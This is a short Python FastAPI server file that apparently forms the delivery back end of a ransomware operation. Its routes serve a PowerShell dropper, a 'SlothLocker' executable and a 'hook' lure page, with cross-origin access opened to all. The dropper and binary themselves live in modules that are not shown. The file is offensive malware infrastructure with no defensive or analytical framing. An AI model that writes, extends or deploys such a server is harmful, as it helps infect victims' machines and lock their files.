import config
import utils
import fastapi



app = fastapi.FastAPI()

@app.get(config.dropperEndpoint)
async def servePowerShellDropperFile(req:fastapi.Request):return await utils.servePowerShellDropperFile(req)

@app.get(config.binEndpoint)
async def serveFinalSlothLockerDotEXE(req:fastapi.Request):return await utils.serveFinalSlothLockerDotEXE(req)

@app.get(config.mainInterfaceEndpoint)
async def mainInterface(req:fastapi.Request):return await utils.mainInterface(req)

@app.get(config.hookPageEndpoint)
async def releiveUser(req:fastapi.Request):return await utils.serveSecondHTML(req)



utils.addMiddleWares(app,allowAll=True)
utils.ServerStartUp(__file__, __name__)



